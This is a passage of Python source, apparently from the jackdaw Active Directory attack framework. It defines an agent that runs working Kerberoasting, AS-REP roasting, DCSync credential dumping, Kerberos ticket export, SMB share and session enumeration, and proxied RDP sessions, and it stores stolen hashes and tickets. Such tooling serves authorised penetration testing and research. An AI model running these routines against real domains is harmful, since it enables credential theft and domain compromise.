import asyncio
import traceback
import platform
import multiprocessing
import logging
import typing
import copy
from aardwolf.connection import RDPConnection

from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.commons.connection.proxy import SMBProxy, SMBProxyType

from minikerberos.common.url import KerberosClientURL
from minikerberos.common.proxy import KerberosProxy
from msldap.commons.url import MSLDAPURLDecoder

from sqlalchemy.exc import IntegrityError
from msldap.commons.target import MSLDAPTarget
from msldap.commons.proxy import MSLDAPProxy, MSLDAPProxyType

from msldap.commons.credential import MSLDAPCredential, LDAPAuthProtocol
from msldap.connection import MSLDAPClientConnection
from msldap.client import MSLDAPClient

from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.target import KerberosTarget, KerberosSocketType
from minikerberos.common.creds import KerberosCredential, KerberosSecretType
from minikerberos.security import Kerberoast, APREPRoast
from minikerberos.common.utils import tgt_to_kirbi
from minikerberos.common.target import KerberosTarget, KerberosSocketType


from jackdaw.dbmodel.adinfo import ADInfo
from jackdaw.dbmodel.graphinfo import GraphInfoAD
from jackdaw.dbmodel.smbfile import SMBFile
from jackdaw.dbmodel.kerberostickets import KerberosTicket
from jackdaw.dbmodel.kerberoast import Kerberoast as DBKerberoast


from jackdaw.nest.ws.protocol import *
from jackdaw.gatherer.smb.utils import sizeof_fmt



from jackdaw import logger
from jackdaw.gatherer.gatherer import Gatherer
from jackdaw.nest.ws.protocol.agent.agent import NestOpAgent
from jackdaw.nest.ws.protocol.smb.smbfileres import NestOpSMBFileRes

from jackdaw.gatherer.progress import GathererProgressType

from jackdaw.dbmodel.adcomp import Machine
from jackdaw.dbmodel.dnslookup import DNSLookup
from jackdaw.dbmodel.credential import Credential
from jackdaw.dbmodel.customcred import CustomCred
from jackdaw.dbmodel.customtarget import CustomTarget

from aiosmb.commons.connection.target import SMBTarget, SMBConnectionProtocol, SMB2_NEGOTIATE_DIALTECTS_2
from aiosmb.commons.connection.credential import SMBCredential, SMBAuthProtocol, SMBCredentialsSecretType
from aiosmb.commons.connection.authbuilder import AuthenticatorBuilder
from aiosmb.connection import SMBConnection
from aiosmb.commons.interfaces.machine import SMBMachine

from jackdaw.dbmodel.netsession import NetSession
from jackdaw.dbmodel.adcomp import Machine
from jackdaw.dbmodel.aduser import ADUser
from jackdaw.dbmodel.adobjprops import ADObjProps
from jackdaw.dbmodel.credential import Credential

from aardwolf.commons.url import RDPConnectionURL
from aardwolf.commons.target import RDPTarget, RDPConnectionProtocol, RDPConnectionDialect
from aardwolf.commons.credential import RDPAuthProtocol
from aardwolf.commons.iosettings import RDPIOSettings
from aardwolf.commons.queuedata import RDPDATATYPE
from aardwolf.commons.queuedata.keyboard import RDP_KEYBOARD_SCANCODE
from aardwolf.commons.queuedata.mouse import RDP_MOUSE
from aardwolf.utils.qt import RDPBitmapToQtImage
from PyQt5.QtCore import QByteArray, QBuffer
from aardwolf.commons.proxy import RDPProxy, RDPProxyType

from jackdaw.nest.ws.operator.operator import NestOperator

logger = logging.getLogger(__name__)

STANDARD_PROGRESS_MSG_TYPES = [
	GathererProgressType.BASIC,  
	GathererProgressType.SD,
	GathererProgressType.SDUPLOAD,
	GathererProgressType.MEMBERS,
	GathererProgressType.MEMBERSUPLOAD,
	GathererProgressType.SMB,
	GathererProgressType.KERBEROAST,
	GathererProgressType.SDCALC,
	GathererProgressType.SDCALCUPLOAD,
	GathererProgressType.INFO,
]

class CONNECTIONPROTO:
	SMB = 'SMB'
	KERBEROS = 'KERBEROS'
	LDAP = 'LDAP'
	RDP = 'RDP'
	DNS = 'DNS'



class JackDawAgent:
	def __init__(self, server, agent_id, agent_type, agent_platform, db_session, work_dir, pid = 0, username = '', domain = '', logonserver = '', cpuarch = '', hostname = '', usersid = '', internal_id = None, proxy = None, router_proto = None, router_host = None, router_port = None):
		self.__server = server
		self.agent_id = agent_id
		self.agent_type = agent_type
		self.platform = agent_platform
		self.pid = pid
		self.username = username
		self.domain = domain
		self.logonserver = logonserver
		self.cpuarch = cpuarch
		self.hostname = hostname
		self.usersid = usersid
		self.internal_id = internal_id
		self.connection_via = []
		self.db_session = db_session
		self.proxy = proxy #this is a mandatory-first proxy to use. if the agent is internal then it's none
		self.cmd_in_q = None
		self.work_dir = work_dir
		self.show_progress = True
		self.router_proto = router_proto
		self.router_host = router_host
		self.router_port = router_port
		self.__cmd_dispatch_table = {}

	async def log(self, level, msg):
		logger.log(level, msg)
	
	async def debug(self, msg):
		await self.log(logging.DEBUG, msg)
	
	async def info(self, msg):
		await self.log(logging.INFO, msg)
	
	async def error(self, msg):
		await self.log(logging.ERROR, msg)

	def get_list_reply(self, cmd):
		agent = NestOpAgent()
		agent.token = cmd.token
		agent.agentid = self.agent_id
		agent.agenttype = self.agent_type
		agent.platform = self.platform
		agent.pid = self.pid
		agent.username = self.username
		agent.domain = self.domain
		agent.logonserver = self.logonserver
		agent.cpuarch = self.cpuarch
		agent.hostname = self.hostname
		agent.usersid = self.usersid
		agent.internal_id = self.internal_id
		return agent

	def get_user_by_name(self, username, domainid):
		try:
			user = self.db_session.query(ADUser.sAMAccountName).filter_by(ad_id = domainid).filter(ADUser.sAMAccountName == username).first()
			if user is None:
				raise Exception('User "%s" not found!' % username)
			
			return user, None

		except Exception as e:
			traceback.print_exc()
			return None, e
	
	def get_machine_by_name(self, machinename, domainid):
		try:
			if machinename[-1] != '$':
				cname = machinename + '$'
			comp = self.db_session.query(Machine.id, Machine.sAMAccountName).filter_by(ad_id = domainid).filter(Machine.sAMAccountName == cname).first()
			if comp is None:
				raise Exception('Machine "%s" not found!' % machinename)
			
			return comp, None

		except Exception as e:
			traceback.print_exc()
			return None, e
	
	#def get_machine_sid_cmd(self, target:NestOpTargetDef):
	#	if target.machine_sid is not None:
	#		return target.machine_sid, None
	#	if target.machine_ad_id is not None:
	#		if target.hostname is not None:
	#			res = self.db_session.query(Machine.objectSid).filter_by(ad_id = target.machine_ad_id).filter(Machine.dNSHostName.like(target.hostname)).first()
	#			if res is not None:
	#				return res[0], None
	#			res = self.db_session.query(Machine.objectSid).filter_by(ad_id = target.machine_ad_id).filter(Machine.sAMAccountName.like(target.hostname)).first()
	#			if res is not None:
	#				return res[0], None
	#			return None, Exception('Machine SID couldn\'t be found via hostname')
	#		if target.ip is not None:
	#			res = self.db_session.query(DNSLookup.sid).filter_by(ad_id = target.machine_ad_id).filter(DNSLookup.ip == target.ip).first()
	#			if res is not None:
	#				return res[0], None
	#		return None, Exception('Machine SID couldn\'t be found via IP')
	#	return None, Exception('Machine SID couldn\'t be found via any methods')
	#	
	#def get_target_address(self, cmd):
	#	if cmd.hostname is not None and len(cmd.hostname) > 0 or cmd.ip is not None and len(cmd.ip) > 0:
	#		return cmd.hostname, cmd.ip
	#	else:
	#		return self.get_target_address_db(cmd.machine_ad_id, cmd.machine_sid)

	#def get_stored_cred(self, cmd:NestOpCredsDef):
	#	domain = None
	#	username = None
	#	password = None
	#
	#	print(cmd.__dict__)
	#	
	#	if cmd.username is not None and len(cmd.username) > 0:
	#		username = cmd.username
	#	if cmd.password is not None and len(cmd.password) > 0:
	#		password = cmd.password
	#	if cmd.domain is not None and len(cmd.domain) > 0:
	#		domain = cmd.domain
	#	
	#	if username == 'auto' and domain is None and cmd.adid is not None:
	#		adinfo = ADInfo.get(cmd.adid)
	#		domain = adinfo.name
	#
	#	print(username)
	#	if username == 'auto' or username is not None:
	#		return True, domain, username, password
	#
	#	return self.get_stored_cred_db(cmd.adid, cmd.sid)

	def get_domain_name_db(self, adid):
		"""
		
		"""
		adinfo = self.db_session.query(ADInfo).get(adid)
		adinfo = typing.cast(ADInfo, adinfo)
		return adinfo.name
	
	def get_domain_name(self, adid):
		if self.domain is not None:
			return self.domain
		return self.get_domain_name_db(adid)

	def get_domain_ip(self, adid):
		"""
		Returns the hostname or IP for an available domain controller
		"""
		if self.logonserver is not None:
			return self.logonserver
		return self.get_domain_ip_db(adid)
	
	def get_domain_ip_db(self, adid):
		"""
		Picks the first available domain controller for the domain which has a dns name.
		"""
		ad_server = self.db_session.query(Machine.dNSHostName).filter_by(UAC_SERVER_TRUST_ACCOUNT = True).filter(Machine.ad_id == adid).filter(Machine.dNSHostName != None).first()
		ad_server = typing.cast(Machine, ad_server)
		return ad_server
	
	def to_asysocks(self, endpoint_ip, endpoint_port):
		proxy = copy.deepcopy(self.proxy)
		proxy.endpoint_ip = endpoint_ip 
		proxy.endpoint_port = int(endpoint_port)
		return proxy
	
	def get_smb_proxy(self, target:SMBTarget):
		if self.proxy is None:
			return target
		proxy = SMBProxy()
		proxy.auth = None
		proxy.type = SMBProxyType.SOCKS5 #doesnt matter here
		proxy.target = [self.to_asysocks(target.get_ip(), int(target.port)).get_target()]

		target.proxy = proxy
		return target

	def get_rdp_proxy(self, target):
		if self.proxy is None:
			return target
		
		proxy = RDPProxy()
		proxy.auth = None
		proxy.type = RDPProxyType.SOCKS5 #doesnt matter here
		proxy.target = [self.to_asysocks(target.get_ip(), int(target.port)).get_target()]

		target.proxy = proxy
	
	def get_ldap_proxy(self, target:MSLDAPTarget):
		if self.proxy is None:
			return target
		proxy = MSLDAPProxy()
		proxy.auth = None
		proxy.type = MSLDAPProxyType.SOCKS5 #doesnt matter here
		proxy.target = [self.to_asysocks(target.host, int(target.port)).get_target()]

		target.proxy = proxy

		return target
	
	def get_kerberos_proxy(self, target:KerberosTarget):
		if self.proxy is None:
			return target

		target.proxy = KerberosProxy([self.to_asysocks(target.ip, int(target.port))], None, type='SOCKS')
		return target

	def get_target_address_db(self, cmd:NestOpTargetDef, protocol:CONNECTIONPROTO):
		"""
		Creates the appropriate TARGET class for a given connection protocol using the connection info in the database
		"""
		print('get_target_db: proto: %s , target: %s' % (protocol, cmd))
		dc_ip = self.get_domain_ip(cmd.adid)
		domain = self.get_domain_name(cmd.adid)
		if str(cmd.adid) == '0':
			res = self.db_session.query(CustomTarget).get(cmd.sid)
			if res is None:
				raise Exception('Target not found!')
			
			res = typing.cast(CustomTarget, res)
			
			if protocol == CONNECTIONPROTO.SMB:
				target = res.get_smb_target(domain = None, proxy = self.proxy, dc_ip = dc_ip, timeout = cmd.timeout)
				return self.get_smb_proxy(target)
				 
			elif protocol == CONNECTIONPROTO.LDAP:
				target = res.get_ldap_target(proxy = self.proxy, timeout = cmd.timeout)
				return self.get_ldap_proxy(target)
			elif protocol == CONNECTIONPROTO.KERBEROS:
				target = res.get_kerberos_target(proxy = self.proxy, timeout = cmd.timeout)
				return self.get_kerberos_proxy(target)
			elif protocol == CONNECTIONPROTO.RDP:
				target = res.get_rdp_target(domain = None, proxy = self.proxy, dc_ip = dc_ip, timeout = cmd.timeout)
				return self.get_rdp_proxy(target)
			elif protocol == CONNECTIONPROTO.DNS:
				return dc_ip
			else:
				raise NotImplementedError()
		
		else:
			samaccname = None
			ip = None
			res = self.db_session.query(Machine.dNSHostName, Machine.sAMAccountName).filter_by(objectSid = cmd.sid).filter(Machine.ad_id == cmd.adid).first()
			if res is not None:
				hostname = res[0]
				samaccname = res[1]
			else:
				res = self.db_session.query(DNSLookup.ip).filter_by(sid = cmd.sid).filter(DNSLookup.ad_id == cmd.adid).first()
				if res is not None:
					ip = res[0]
			
			if hostname is None and ip is None and samaccname is None:
				raise Exception('Couldnt find address for target')
			
			if hostname is None and ip is None:
				hostname = samaccname

			hostname_or_ip = hostname
			if hostname_or_ip is None:
				hostname_or_ip = ip
			
			print('hostname: %s' % hostname)
			print('ip: %s' % ip)
			print('samaccname : %s' % samaccname)
			print('hostname_or_ip : %s' % hostname_or_ip)
			
			
			if hostname is None and ip is None:
				raise Exception('Couldnt find address for server %s' % cmd.sid)
			
			if protocol == CONNECTIONPROTO.SMB:
				target = SMBTarget(
					ip = ip,
					hostname = hostname, 
					timeout = cmd.timeout,
					dc_ip = dc_ip, 
					domain = domain, 
					proxy = self.proxy,
					protocol = SMBConnectionProtocol.TCP,
					path = None
				)
				return self.get_smb_proxy(target)
			elif protocol == CONNECTIONPROTO.LDAP:
				target = MSLDAPTarget(
					hostname_or_ip, 
					#port = 389, 
					#proto = LDAPProtocol.TCP, 
					#tree = None, 
					proxy = None, 
					timeout = cmd.timeout, 
					#ldap_query_page_size = 1000, 
					#ldap_query_ratelimit = 0
				)
				return self.get_ldap_proxy(target)
			elif protocol == CONNECTIONPROTO.KERBEROS:
				kt = KerberosTarget()
				kt.ip = hostname_or_ip
				kt.port = 88
				kt.protocol = KerberosSocketType.TCP
				kt.proxy = None
				kt.timeout = cmd.timeout
				return self.get_kerberos_proxy(kt)
			elif protocol == CONNECTIONPROTO.RDP:
				target = RDPTarget(
					ip = ip,
					hostname = hostname,
					dc_ip = dc_ip,
					domain = domain,
					proxy = self.proxy
				)
				return self.get_rdp_proxy(target)
			elif protocol == CONNECTIONPROTO.DNS:
				return dc_ip
			else:
				raise NotImplementedError()

	def get_stored_cred_db(self, cmd:NestOpCredsDef, protocol:CONNECTIONPROTO, target = None):
		try:
			settings = None
			if self.internal_id is not None:
				settings = {
					'proto': [self.router_proto],
					'port' : [self.router_port],
					'host' : [self.router_host],
					'agentid' : [self.internal_id]
				}

			res = None
			if str(cmd.adid) == '0':
				res = self.db_session.query(CustomCred).get(cmd.sid)
				res = typing.cast(CustomCred, res)
				if protocol == CONNECTIONPROTO.SMB:
					return res.get_smb_cred(cmd.authtype, target = target, settings = settings), None
				elif protocol == CONNECTIONPROTO.LDAP:
					return res.get_ldap_cred(cmd.authtype, target = target, settings = settings), None
				elif protocol == CONNECTIONPROTO.KERBEROS:
					return res.get_kerberos_cred(), None
				elif protocol == CONNECTIONPROTO.RDP:
					return res.get_rdp_cred(RDPAuthProtocol('PLAIN'), target = target), None
				else:
					raise NotImplementedError()
				
			else:
				authtype = cmd.authtype.upper()
				if authtype in ['RC4', 'NT', 'AES']:
					# secrets for these auth thypes might be present in the Credentials table
					res = self.db_session.query(Credential).filter_by(object_sid = cmd.sid).filter(Credential.ad_id == cmd.adid).filter(Credential.history_no == 0).first()
					if res is None:
						raise Exception('Couldnt find suiteable credential!')
					
					res = typing.cast(Credential, res)
					if protocol == CONNECTIONPROTO.SMB:
						return res.get_smb_cred(SMBAuthProtocol(cmd.authtype), target = target), None
					elif protocol == CONNECTIONPROTO.LDAP:
						return res.get_ldap_cred(cmd.authtype, target= target), None
					elif protocol == CONNECTIONPROTO.KERBEROS:
						return res.get_kerberos_cred(), None
					elif protocol == CONNECTIONPROTO.RDP:
						return res.get_rdp_cred(SMBAuthProtocol(cmd.authtype), target = target), None
					else:
						raise NotImplementedError()
			
			raise Exception('Failed to find credential for user sid %s' % cmd.sid)

		except Exception as e:
			return None, e

	def get_smb_connection(self, cmd):
		try:
			target = self.get_target_address_db(cmd.target, CONNECTIONPROTO.SMB)
			credential, err = self.get_stored_cred_db(cmd.creds, CONNECTIONPROTO.SMB, target=target)
			if err is not None:
				raise err
			
			gssapi = AuthenticatorBuilder.to_spnego_cred(credential, target)
			connection = SMBConnection(gssapi, target)

			return connection, None
		except Exception as e:
			traceback.print_exc()
			return None, e
	
	def get_ldap_connection(self, cmd):
		try:
			target = self.get_target_address_db(cmd.target, CONNECTIONPROTO.LDAP)
			credential, err = self.get_stored_cred_db(cmd.creds, CONNECTIONPROTO.LDAP, target=target)
			print(target)
			print(credential)
			if err is not None:
				raise err
			
			return MSLDAPClientConnection(target, credential), None
		except Exception as e:
			traceback.print_exc()
			return None, e
	
	def get_kerberos_connection(self, cmd):
		try:
			target = self.get_target_address_db(cmd.target, CONNECTIONPROTO.KERBEROS)
			if hasattr(cmd, 'creds') is False:
				# asreproast doesnt need creds
				return target, None, None
			
			credential, err = self.get_stored_cred_db(cmd.creds, CONNECTIONPROTO.KERBEROS, target)
			if err is not None:
				raise err

			return target, credential, None
		except Exception as e:
			traceback.print_exc()
			return None, None, e

	async def rdp_input_monitor(self, operator:NestOperator, cmd:NestOpRDPConnect, rdpconn:RDPConnection, out_q, op_in_q):
		try:
			while not operator.disconnected_evt.is_set():
				data = await op_in_q.get()
				if data.cmd == NestOpCmd.RDPMOUSE:
					rmouse = RDP_MOUSE()
					rmouse.xPos = data.xPos
					rmouse.yPos = data.yPos
					rmouse.button = data.button
					rmouse.pressed = data.pressed
					await rdpconn.ext_in_queue.put(rmouse)

		
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_rdpconnect error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
		
	async def do_rdpconnect(self, operator:NestOperator, cmd:NestOpRDPConnect, out_q, op_in_q):
		try:
			height = 768
			width = 1024

			iosettings = RDPIOSettings()
			iosettings.video_width = width
			iosettings.video_height = height
			iosettings.video_bpp_min = 15 #servers dont support 8 any more :/
			iosettings.video_bpp_max = 32

			target = self.get_target_address_db(cmd.target, CONNECTIONPROTO.RDP)
			cred, err = self.get_stored_cred_db(cmd.creds, protocol=CONNECTIONPROTO.RDP)
			if err is not None:
				raise err

			proxy = None

			rdpurl = RDPConnectionURL(None, target = target, cred = cred, proxy = proxy)
			rdpconn = rdpurl.get_connection(iosettings)
			_, err = await rdpconn.connect()
			if err is not None:
				raise err

			asyncio.create_task(self.rdp_input_monitor(operator, cmd, rdpconn, out_q, op_in_q))
			while not operator.disconnected_evt.is_set():
				try:
					data = await rdpconn.ext_out_queue.get()
					if data is None:
						return
					if data.type == RDPDATATYPE.VIDEO:
						image = RDPBitmapToQtImage(data.width, data.height, data.bitsPerPixel, data.is_compressed, data.data)
						qbytearr = QByteArray()
						buf = QBuffer(qbytearr)
						image.save(buf, 'PNG')
						imagedata = str(qbytearr.toBase64())[2:-1]
						ri = NestOpRDPRectangle()
						ri.token = cmd.token
						ri.x = data.x
						ri.y = data.y
						ri.image = imagedata
						ri.height = data.height
						ri.width = data.width
						ri.imgtype = 'PNG'
						await out_q.put(ri)
						

					elif data.type == RDPDATATYPE.CLIPBOARD_READY:
						continue
					else:
						logger.debug('Unknown incoming data: %s'% data)
				except Exception as e:
					traceback.print_exc()
					print('do_rdpconnect error! %s' % e)
					await out_q.put(NestOpErr(cmd.token, str(e)))
					return


		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_rdpconnect error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
		finally:
			if rdpconn is not None:
				await asyncio.wait_for(rdpconn.terminate(), 5)
				print('RDP disconnected!')


	async def do_smbfiles(self, operator:NestOperator, cmd, out_q, op_in_q):
		try:
			connection, err = self.get_smb_connection(cmd)
			if err is not None:
				raise err

			# TODO: additional lookups for custom targets!!!
			machine_sid = cmd.target.adid
			machine_ad_id = cmd.target.sid


			async with connection:
				_, err = await connection.login()
				if err is not None:
					raise err
				async with SMBMachine(connection) as machine:
					async for obj, otype, err in machine.enum_all_recursively(depth=cmd.depth):
						otype_short = otype[0].upper()
						if otype_short in ['F', 'D']:

							if machine_sid is not None and machine_ad_id is not None:
								sf = SMBFile()
								sf.machine_sid = machine_sid
								sf.unc = obj.unc_path
								sf.otype = otype
								sf.creation_time = obj.creation_time
								sf.last_access_time = obj.last_access_time
								sf.last_write_time = obj.last_write_time
								sf.change_time = obj.change_time
								if obj.security_descriptor is not None and obj.security_descriptor != '':
									sf.sddl = obj.security_descriptor.to_sddl()
								if otype_short == 'F':
									sf.size = obj.size
									sf.size_ext = sizeof_fmt(sf.size)
								
								self.db_session.add(sf)
								self.db_session.commit()



							reply = NestOpSMBFileRes()
							reply.token = cmd.token
							reply.machine_ad_id = machine_ad_id
							reply.machine_sid = machine_sid
							reply.otype = otype_short
							reply.unc_path = obj.unc_path
							await out_q.put(reply)

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_smbfiles error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))

	async def do_smbsessions(self, operator:NestOperator, cmd, out_q, op_in_q):
		try:
			target_machine_ad_id = cmd.target.adid
			target_machine_sid = cmd.target.sid
			
			connection, err = self.get_smb_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			async with connection:
				_, err = await connection.login()
				if err is not None:
					raise err
				async with SMBMachine(connection) as machine:
					async for smbsess, err in machine.list_sessions():
						if err is not None:
							raise err
						
						if target_machine_ad_id is not None and target_machine_sid is not None:
							sess = NetSession()
							sess.ad_id = target_machine_ad_id
							sess.machine_sid = target_machine_ad_id
							sess.source = None #TODO: get name
							sess.username = smbsess.username
							sess.ip = smbsess.ip_addr
							try:
								self.db_session.add(sess)
								self.db_session.commit()
							except:
								self.db_session.rollback()
								continue

						
						sr = NestOpSMBSessionRes()
						sr.token = cmd.token
						sr.adid = target_machine_ad_id
						sr.machinesid = target_machine_sid
						sr.username = smbsess.username

						await out_q.put(sr)


			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_smbsessions error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))

	async def do_ldapspns(self, operator:NestOperator, cmd:NestOpLDAPSPNs, out_q, op_in_q):
		try:
			connection, err = self.get_ldap_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			_, err = await connection.connect()
			if err is not None:
				raise err
			
			res, err = await connection.bind()
			if err is not None:
				return False, err

			client = MSLDAPClient(None, None, connection)
			_, err = await client.connect()
			if err is not None:
				raise err
			
			async for entry, err in client.get_all_service_users():
				if err is not None:
					raise err

				reply = NestOpUserRes()
				reply.token = cmd.token
				reply.name = entry.name
				reply.adid = None #we dont know this at this point
				reply.sid = entry.objectSid
				reply.kerberoast = 1
						
				await out_q.put(reply)

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_smbdcsync error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
	
	async def do_smbdcsync(self, operator:NestOperator, cmd:NestOpSMBDCSync, out_q, op_in_q):
		try:
			connection, err = self.get_smb_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			
			res = self.db_session.query(ADInfo).get(cmd.target_user.adid)
			if res is None:
				raise Exception('Could not find target user domain!')
			targetdomain = res.get_domainname()

			res = self.db_session.query(GraphInfoAD.graph_id).filter_by(ad_id = cmd.target_user.adid).first()
			if res is None:
				raise Exception('Target graph could not be found!')
			
			targetgraphid = res[0]

			targetuser = []
			if cmd.target_user.sid is not None:
				res = self.db_session.query(ADUser.sAMAccountName).filter_by(objectSid = cmd.target_user.sid).filter(ADUser.ad_id == cmd.target_user.adid).first()
				if res is None:
					raise Exception('Could not find target user name!')
				targetuser = [res[0]]


			async with connection:
				_, err = await connection.login()
				if err is not None:
					raise err
				async with SMBMachine(connection) as machine:
					async for secret, err in machine.dcsync(target_domain = targetdomain, target_users = targetuser):
						if err is not None:
							raise err
						
						if secret is None:
							continue
						
						p = ADObjProps(int(targetgraphid), str(secret.object_sid), 'OWNED')
						self.db_session.add(p)
						self.db_session.commit()
						
						for line in str(secret).split('\r\n'):
							if line == '':
								continue
							cred, _ = Credential.from_aiosmb_line(line, cmd.target_user.adid)
							try:
								self.db_session.add(cred)
								self.db_session.commit()
							except IntegrityError:
								self.db_session.rollback()

						sr = NestOpObjOwned()
						sr.token = cmd.token
						sr.graphid = targetgraphid
						sr.set = True
						sr.oid = str(secret.object_sid)
						sr.otype = 'USER' if not secret.username.endswith('$') else 'MACHINE'
						
						await out_q.put(sr)


			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_smbdcsync error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
	
	async def do_kerberoast(self, operator:NestOperator, cmd:NestOpKerberoast, out_q, op_in_q):
		try:
			target, credential, err = self.get_kerberos_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			res = self.db_session.query(ADInfo).get(cmd.target_user.adid)
			if res is None:
				raise Exception('Could not find target user domain!')
			domainname = res.get_domainname()
			
			res = self.db_session.query(ADUser.sAMAccountName).filter_by(objectSid = cmd.target_user.sid).filter(ADUser.ad_id == cmd.target_user.adid).first()
			if res is None:
				raise Exception('Could not find target user name!')
			
			
			spn = '%s@%s' % (res[0], domainname)
			spn = KerberosSPN.from_user_email(spn)
			
			kr = Kerberoast(target, credential)
			results = await kr.run([spn])
			for result in results:

				p = DBKerberoast.from_hash(cmd.target_user.adid, cmd.target_user.sid, result)
				self.db_session.add(p)
				self.db_session.commit()

				res = NestOpKerberoastRes()
				res.token = cmd.token
				res.ticket = result
				await out_q.put(res)

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_kerberoast error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
	
	async def do_gettgt(self, operator:NestOperator, cmd:NestOpKerberosTGT, out_q, op_in_q):
		try:
			target, credential, err = self.get_kerberos_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			connection = AIOKerberosClient(credential,target)
			await connection.get_TGT()
			kirbi = tgt_to_kirbi(connection.kerberos_TGT, connection.kerberos_TGT_encpart).dump().hex()

			p = KerberosTicket()
			p.ad_id = cmd.creds.adid
			p.type = 'TGT'
			p.kirbi = kirbi
			self.db_session.add(p)
			self.db_session.commit()
			
			
			res = NestOpKerberosTGTRes()
			res.token = cmd.token
			res.ticket = kirbi
			await out_q.put(res)

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_gettgt error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))
	
	async def do_gettgs(self, operator:NestOperator, cmd:NestOpKerberosTGS, out_q, op_in_q):
		try:
			target, credential, err = self.get_kerberos_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			if cmd.spn.find('@') != -1:
				spn = KerberosSPN.from_user_email(cmd.spn)
			else:
				spn = KerberosSPN.from_target_string(cmd.spn)
			
			connection = AIOKerberosClient(credential, target)
			await connection.get_TGT()
			tgs, encTGSRepPart, key = await connection.get_TGS(spn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump().hex()

			p = KerberosTicket()
			p.ad_id = cmd.creds.adid
			p.type = 'TGS'
			p.kirbi = kirbi
			self.db_session.add(p)
			self.db_session.commit()

			res = NestOpKerberosTGSRes()
			res.token = cmd.token
			res.ticket = kirbi
			await out_q.put(res)
			

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			await out_q.put(NestOpErr(cmd.token, str(e)))
	
	async def do_asreproast(self, operator:NestOperator, cmd, out_q, op_in_q):
		try:
			target, _, err = self.get_kerberos_connection(cmd)
			if err is not None:
				await out_q.put(NestOpErr(cmd.token, str(err)))
				return
			
			res = self.db_session.query(ADInfo).get(cmd.target_user.adid)
			if res is None:
				raise Exception('Could not find target user domain!')
			domainname = res.get_domainname()
			
			res = self.db_session.query(ADUser.sAMAccountName).filter_by(objectSid = cmd.target_user.sid).filter(ADUser.ad_id == cmd.target_user.adid).first()
			if res is None:
				raise Exception('Could not find target user name!')

			credential = KerberosCredential()
			credential.username = res[0]
			credential.domain = domainname

			kr = APREPRoast(target)
			result = await kr.run(credential, override_etype = [23])
			if result is not None:
				p = DBKerberoast.from_hash(cmd.target_user.adid, cmd.target_user.sid, result)
				self.db_session.add(p)
				self.db_session.commit()
				
				res = NestOpASREPRoastRes()
				res.token = cmd.token
				res.ticket = result
				await out_q.put(res)

			await out_q.put(NestOpOK(cmd.token))
		except asyncio.CancelledError:
			return
		except Exception as e:
			traceback.print_exc()
			print('do_asreproast error! %s' % e)
			await out_q.put(NestOpErr(cmd.token, str(e)))

	async def __gathermonitor(self, operator:NestOperator ,cmd, results_queue, out_q):
		try:
			usernames_testing = []
			machine_sids_testing = []
			
			temp_tok_testing = None
			temp_adid_testing = None
			temp_started = False
			
			while not operator.disconnected_evt.is_set():
				try:
					msg = await results_queue.get()
					if msg is None:
						break
					
					#print(msg)
					if msg.type in STANDARD_PROGRESS_MSG_TYPES:
						##### TESTING
						temp_tok_testing = cmd.token
						temp_adid_testing = msg.adid
						
						######
						reply = NestOpGatherStatus()
						reply.token = cmd.token
						reply.current_progress_type = msg.type.value
						reply.msg_type = msg.msg_type.value
						reply.adid = msg.adid
						reply.graphid = msg.graphid
						reply.domain_name = msg.domain_name
						reply.total = msg.total
						reply.step_size = msg.step_size
						reply.basic_running = []
						if msg.running is not None:
							reply.basic_running = [x for x in msg.running]
						reply.basic_finished = msg.finished
						reply.smb_errors = msg.errors
						reply.smb_sessions = msg.sessions
						reply.smb_shares = msg.shares
						reply.smb_groups = msg.groups
						await out_q.put(reply)
						#await self.websocket.send(reply.to_json())
						
						####TESTINGTESTING!!!!
						#if msg.type.value != 'LDAP_BASIC':
						#	if temp_started is False:
						#		asyncio.create_task(self.spam_sessions(temp_tok_testing, temp_adid_testing, machine_sids_testing, usernames_testing))
						#		temp_started = True
								
					elif msg.type == GathererProgressType.USER:
						usernames_testing.append(msg.data.sAMAccountName)
						reply = NestOpUserRes()
						reply.token = cmd.token
						reply.name = msg.data.sAMAccountName
						reply.adid = msg.data.ad_id
						reply.sid = msg.data.objectSid
						reply.kerberoast = 1 if msg.data.servicePrincipalName is not None else 0
						reply.asreproast = int(msg.data.UAC_DONT_REQUIRE_PREAUTH)
						reply.nopassw = int(msg.data.UAC_PASSWD_NOTREQD)
						reply.cleartext = int(msg.data.UAC_ENCRYPTED_TEXT_PASSWORD_ALLOWED)
